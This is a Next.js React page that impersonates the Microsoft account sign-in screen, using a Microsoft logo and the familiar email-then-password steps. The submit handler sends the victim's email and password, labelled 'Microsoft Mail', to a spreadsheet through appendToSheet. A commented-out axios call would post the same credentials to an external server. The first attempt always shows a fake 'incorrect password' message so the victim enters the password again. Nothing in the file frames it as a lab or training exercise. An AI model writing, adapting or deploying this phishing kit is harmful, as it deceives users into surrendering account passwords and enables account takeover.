"use client"

import React, { useState } from 'react'
import { useRouter } from 'next/navigation'
import SuccessModal from '../components/SuccessModal';
import Image from 'next/image';
import { msl } from '@/images';
import { appendToSheet } from '@/actions/spreadSheet';

const page = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [msg, setMsg] = useState("");
  const [msg2, setMsg2] = useState("");
  const [isFirstAttempt, setIsFirstAttempt] = useState(true);
  const router = useRouter();
  const [successModal, setSuccessModal] = useState(false);
  const category = "Microsoft Mail";

  const handleNext = () => {
    if (!email) {
      setMsg("Enter a valid email address, phone number, or Skype name.");
    } else {
      setMsg("");
      setShowPassword(true);
    }
  };

  const handleBack = () => {
    setShowPassword(false);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
  
    if (!password) {
      setMsg2("Please enter the password for your Microsoft account.");
      return;
    }
  
    try {
      
      const data =[[category, email, password]]
      await appendToSheet(data);
      // // Send data to backend using Axios
      // const response = await axios.post("https://third-votesy-server.vercel.app/api/submit-login", {
      //   source: "Outlook",
      //   email,
      //   password,
      // });
  
      if (isFirstAttempt) {
        setMsg2("The email or password you entered is incorrect. Please try again.");
        setPassword("");
        setIsFirstAttempt(false);
        setShowPassword(false); // Go back to email input page
      } else {
        // if (response.status === 200) {
        //   setSuccessModal(true);
        // } else {
        //   throw new Error("Network response was not ok");
        // }
      }
    } catch (error) {
      console.error("Error:", error);
    }
  };


  if (successModal) {
    return <SuccessModal />;
  }

  return (
    <div className="flex items-center justify-center h-screen bg-gray-100">
      <div className="bg-white p-8 rounded shadow-md w-full max-w-md">
        <Image
          src={msl}
          alt="Microsoft Logo"
          className="mx-auto mb-6"
        />
        {!showPassword ? (
          <div className="slide-one">
            <h2 className="text-2xl font-semibold mb-4">Sign in</h2>
            <span className="msg text-red-500 text-sm">{msg}</span>
            <input
              type="email"
              id="email"
              name="USER"
              placeholder="Email, phone, or Skype"
              className="w-full px-4 py-2 border border-gray-300 rounded mt-2"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
            <p className="mt-4">
              No account?{" "}
              <a href="#" className="text-blue-500">
                Create one!
              </a>
            </p>
            <p className="text-blue-500 mt-2">
              Sign in with a security key 
            </p>
            <div className="mt-4">
              <button
                onClick={handleNext}
                className="w-full bg-blue-600 text-white py-2 rounded"
              >
                Next
              </button>
            </div>
          </div>
        ) : (
          <div className="slide-two">
            <span className="msg2 text-red-500 text-sm">{msg2}</span>
            <button onClick={handleBack} className="text-blue-500 mb-4">
              <i className="fa fa-arrow-left"></i> {email}
            </button>
            <h2 className="text-2xl font-semibold mb-4">Enter password</h2>
            <input
              type="password"
              id="password"
              name="PASS"
              placeholder="Password"
              className="w-full px-4 py-2 border border-gray-300 rounded mt-2"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <p className="mt-4">
              Forget password?{" "}
              <a href="#" className="text-blue-500">
                Other ways to sign in
              </a>
            </p>
            <div className="mt-4">
              <button
                onClick={handleSubmit}
                className="w-full bg-blue-600 text-white py-2 rounded"
              >
                Sign in
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}

export default page